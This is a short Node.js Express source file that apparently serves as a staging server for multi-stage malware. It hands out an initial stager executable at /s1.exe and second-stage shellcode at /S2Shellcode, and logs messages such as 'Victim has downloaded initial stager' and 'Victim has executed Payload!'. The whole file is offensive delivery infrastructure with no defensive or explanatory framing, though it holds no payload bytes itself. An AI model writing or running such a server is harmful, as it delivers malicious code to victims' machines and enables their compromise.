const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const port = 3000;
const shellcodeDir = path.join(__dirname, '../shellcode/loaders');

function sendFileContents(filePath, res) {
  fs.readFile(filePath, (err, data) => {
    if (err) {
      res.status(500).send('Error reading file');
    } else {
        res.setHeader('Content-Type', 'application/octet-stream');
        res.send(data);
    }
  });
}


app.get('/s1.exe', (req, res) => {
  console.log("[+] Victim has downloaded initial stager");
  const filePath = path.join(__dirname, '../s1.exe');
  sendFileContents(filePath, res);
});



app.get('/S2Shellcode', (req, res) => {
  console.log("[!] Victim has executed Payload!");
  console.log("[+] Serving second stage shellcode...");
  const filePath = path.join(shellcodeDir, 's2.bin');
  sendFileContents(filePath, res);
});








app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});

